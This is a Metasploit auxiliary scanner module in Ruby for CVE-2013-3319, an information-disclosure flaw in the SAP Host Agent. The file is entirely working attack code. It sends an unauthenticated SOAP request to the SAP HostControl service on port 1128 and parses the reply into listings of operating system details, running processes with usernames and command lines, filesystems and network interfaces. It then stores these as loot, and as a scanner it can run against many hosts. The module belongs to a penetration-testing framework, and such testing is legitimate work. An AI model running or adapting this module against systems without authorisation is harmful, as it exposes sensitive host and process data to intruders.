##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner


  def initialize
    super(
      'Name' => 'SAP Host Agent Information Disclosure',
      'Description' => %q{
        This module attempts to retrieve Computer and OS info from Host Agent
        through the SAP HostControl service.
        },
      'References' =>
        [
          # General
          ['CVE', '2013-3319'],
          ['OSVDB', '95616'],
          ['BID', '61402'],
          ['URL', 'https://service.sap.com/sap/support/notes/1816536'],
          ['URL', 'http://labs.integrity.pt/advisories/cve-2013-3319/']
        ],
      'Author' =>
        [
          'Bruno Morisson <bm[at]integrity.pt>' # Discovery and msf module
        ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(1128)
      ])

    register_autofilter_ports([1128])


  end

  def initialize_tables

    @computer_table = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header' => "Remote Computer Listing",
      'Prefix' => "\n",
      'Postfix' => "\n",
      'Indent' => 1,
      'Columns' =>
        [
          "Names",
          "Hostnames",
          "IPAddresses"
        ])

    @os_table = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header' => "Remote OS Listing",
      'Prefix' => "\n",
      'Postfix' => "\n",
      'Indent' => 1,
      'Columns' =>
        [
          "Name",
          "Type",
          "Version",
          "TotalMemSize",
          "Load Avg 1m",
          "Load Avg 5m",
          "Load Avg 15m",
          "CPUs",
          "CPU User",
          "CPU Sys",
          "CPU Idle"
        ])
    @net_table = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header' => "Network Port Listing",
      'Prefix' => "\n",
      'Postfix' => "\n",
      'Indent' => 1,
      'Columns' =>
        [
          "ID",
          "PacketsIn",
          "PacketsOut",
          "ErrorsIn",
          "ErrorsOut",
          "Collisions"
        ])

    @process_table = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header' => "Remote Process Listing",
      'Prefix' => "\n",
      'Postfix' => "\n",
      'Indent' => 1,
      'Columns' =>
        [
          "Name",
          "PID",
          "Username",
          "Priority",
          "Size",
          "Pages",
          "CPU",
          "CPU Time",
          "Command"
        ])

    @fs_table = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header' => "Remote Filesystem Listing",
      'Prefix' => "\n",
      'Postfix' => "\n",
      'Indent' => 1,
      'Columns' =>
        [
          "Name",
          "Size",
          "Available",
          "Remote"
        ])

    @net_table = Msf::Ui::Console::Table.new(
      Msf::Ui::Console::Table::Style::Default,
      'Header' => "Network Port Listing",
      'Prefix' => "\n",
      'Postfix' => "\n",
      'Indent' => 1,
      'Columns' =>
        [
          "ID",
          "PacketsIn",
          "PacketsOut",
          "ErrorsIn",
          "ErrorsOut",
          "Collisions"
        ])

  end

  # Parses an array of mProperties elements. For every mProperties element,
  # if there is an item with mValue ITSAMComputerSystem, then collect the
  # values for the items with mName in (Name, Hostnames, IPAdresses)
  def parse_computer_info(data)
    success = false
    data.each do |properties|
      name, hostnames, addresses = ""

      if properties.get_elements("item//mValue[text()=\"ITSAMComputerSystem\"]").empty?
        next
      end

      item_list = properties.get_elements("item")
      item_list.each do |item|
        item_name = item.get_elements("mName").first.text
        item_value = item.get_elements("mValue").first.text

        case item_name
        when "Name"
          name = item_value
        when "Hostnames"
          hostnames = item_value
        when "IPAdresses"
          addresses = item_value
        end
      end

      @computer_table << [name, hostnames, addresses]

      success = true
    end

    return success
  end

  # Get the mValues of every item
  def parse_values(data, ignore)
    values = []

    item_list = data.get_elements("item")
    item_list.each do |item|
      value_item = item.get_elements("mValue")

      if value_item.empty?
        value = ""
      else
        value = value_item.first.text
      end

      if value == ignore
        next
      end

      values << value
    end
    return values
  end

  # Parses an array of mProperties elements and get the interesting info
  # including ITSAMOperatingSystem, ITSAMOSProcess, ITSAMFileSystem and
  # ITSAMNetworkPort properties.
  def parse_detailed_info(data)
    data.each do |properties|
      if not properties.get_elements("item//mValue[text()=\"ITSAMOperatingSystem\"]").empty?
        values = parse_values(properties, "ITSAMOperatingSystem")
        parse_os_info(values)
      end

      if not properties.get_elements("item//mValue[text()=\"ITSAMOSProcess\"]").empty?
        values = parse_values(properties, "ITSAMOSProcess")
        parse_process_info(values)
      end

      if not properties.get_elements("item//mValue[text()=\"ITSAMFileSystem\"]").empty?
        values = parse_values(properties, "ITSAMFileSystem")
        parse_fs_info(values)
      end

      if not properties.get_elements("item//mValue[text()=\"ITSAMNetworkPort\"]").empty?
        values = parse_values(properties, "ITSAMNetworkPort")
        parse_net_info(values)
      end
    end
  end

  def parse_os_info(os_info)
    @os_table << [
      os_info[0],      # OS name
      os_info[1],      # OS type
      os_info[2],      # OS Version
      os_info[7],      # Total Memory
      os_info[11],     # Load Average (1m)
      os_info[12],     # Load Average (5m)
      os_info[13],     # Load Average (15m)
      os_info[17],     # Number of CPUs / Cores
      os_info[18]+'%', # CPU usage (User)
      os_info[19]+'%', # CPU usage (system)
      os_info[20]+'%'  # CPU idle
    ]
  end

  def parse_process_info(process_info)
    @process_table << [
      process_info[0],     # Process name
      process_info[1],     # PID
      process_info[2],     # Username
      process_info[3],     # Priority
      process_info[4],     # Mem size
      process_info[5],     # pages
      process_info[6]+'%', # CPU usage
      process_info[7],     # CPU time
      process_info[8]      # Command
    ]
  end

  def parse_fs_info(fs_info)
    @fs_table << [
      fs_info[0],  # Filesystem Name
      fs_info[2],  # Size
      fs_info[3],  # Space Available
      fs_info[6]   # Is the filesystem remote ?
    ]
  end

  def parse_net_info(net_info)
    @net_table << [
      net_info[0], # Network Device ID
      net_info[1], # Packets In
      net_info[2], # Packets Out
      net_info[3], # Errors In
      net_info[4], # Errors Out
      net_info[5]  # Collisions
    ]
  end


  def run_host(rhost)

    vprint_status("#{rhost}:#{rport} - Connecting to SAP Host Control service")

    data = '<?xml version="1.0" encoding="utf-8"?>'
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"'
    data << 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">'
    data << '<SOAP-ENV:Header><sapsess:Session xlmns:sapsess="http://www.sap.com/webas/630/soap/features/session/">'
    data << '<enableSession>true</enableSession></sapsess:Session></SOAP-ENV:Header><SOAP-ENV:Body>'
    data << '<ns1:GetComputerSystem xmlns:ns1="urn:SAPHostControl"><aArguments><item>'
    data << '<mKey>provider</mKey><mValue>saposcol</mValue></item></aArguments></ns1:GetComputerSystem>'
    data << "</SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n"

    begin

      res = send_request_raw(
        {
          'uri' => "/",
          'method' => 'POST',
          'data' => data,
          'headers' => {
            'Content-Type' => 'text/xml; charset=UTF-8',
          }
        })

    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Unable to connect to service")
      return
    end

    if res and res.code == 500 and res.body =~ /<faultstring>(.*)<\/faultstring>/i
      faultcode = $1.strip
      vprint_error("#{rhost}:#{rport} - Error code: #{faultcode}")
      return

    elsif res and res.code != 200
      vprint_error("#{rhost}:#{rport} - Error in response")
      return
    end

    initialize_tables()

    vprint_good("#{rhost}:#{rport} - Connected. Retrieving info")

    begin
      response_xml = REXML::Document.new(res.body)
      computer_info = response_xml.elements.to_a("//mProperties/") # Computer info
      detailed_info = response_xml.elements.to_a("//item/mProperties/") # all other info
    rescue
      print_error("#{rhost}:#{rport} - Unable to parse XML response")
      return
    end

    success = parse_computer_info(computer_info)
    if success
      print_good("#{rhost}:#{rport} - Information retrieved successfully")
    else
      print_error("#{rhost}:#{rport} - Unable to parse reply")
      return
    end

    # assume that if we can parse the first part, it is a valid SAP XML response
    parse_detailed_info(detailed_info)

    sap_tables_clean = ''

    [@os_table, @computer_table, @process_table, @fs_table, @net_table].each do |t|
      sap_tables_clean << t.to_s
    end

    vprint_good("#{rhost}:#{rport} - Information retrieved:\n"+sap_tables_clean)

    xml_raw = store_loot(
      "sap.getcomputersystem",
      "text/xml",
      rhost,
      res.body,
      "sap_getcomputersystem.xml",
      "SAP GetComputerSystem XML"
    )

    xml_parsed = store_loot(
      "sap.getcomputersystem",
      "text/plain",
      rhost,
      sap_tables_clean,
      "sap_getcomputersystem.txt",
      "SAP GetComputerSystem XML"
    )

    print_status("#{rhost}:#{rport} - Response stored in #{xml_raw} (XML) and #{xml_parsed} (TXT)")

  end
end
